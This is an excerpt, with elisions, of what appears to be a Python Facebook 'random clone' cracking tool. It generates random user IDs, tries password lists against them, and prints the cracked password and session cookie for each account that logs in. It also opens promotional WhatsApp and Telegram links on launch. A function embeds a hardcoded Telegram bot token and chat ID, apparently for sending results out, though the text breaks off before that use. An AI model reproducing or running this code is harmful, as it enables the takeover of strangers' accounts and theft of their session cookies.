...
for xd in range(100):
    ...
    uaku2=(f'{a}{b}{c}{d}{e}{f}')
    ugen.append(uaku2)
os.system('xdg-open https://chat.whatsapp.com/CVqVcVgBGOtHcfGtsGJwjg')
os.system('xdg-open https://t.me/ffidsall1k')
logo = ("""\033[38;5;46m
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
[✓]RANDOM CLONE━━━━TOOL 
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
...
[✓] GITHUB━━━━INSURE12
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
[✓] INSTAGRAM━━━━RUP_EDITZ45
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
[✓] TELEGRAM ━━━━MR_PYTHON45
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
[✓] YOUTUBE━━━━INSURE GAMERS YT
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━             
\033[38;5;46m██████  ██    ██ ██████  
\033[33;1m██   ██ ██    ██ ██   ██ 
\033[34;1m██████  ██    ██ ██████  
...
def rcrack1(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r[\033[1;92mRUP\033[1;97m] > [%s/%s] > [OK\033[1;97m:-\033[1;92m%s\033[1;97m] - [CP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(f"\033[38;5;46m[RUP-OK] {uid} | {ps}")
                print(f" Cookie : {coki}")
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\x1b[38;5;196m[RUP-CP] {cid} | {ps}")
                ...
                continue
        loop+=1
        #sys.stdout.write(f'\r\033[m[RUP] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
        #sys.stdout.flush()
    except:
        pass
...
def suyaib():
    ...
    bot_token = '6799208025:AAECO_7z3oOwBVZ8yw0Wwpu9SSsv2VDTPMc' 
    chat_id = '6448663837'    
    #-------------( /sdcard\ )--------------#  
    #--------------------apk-------------------#																																							
    try:
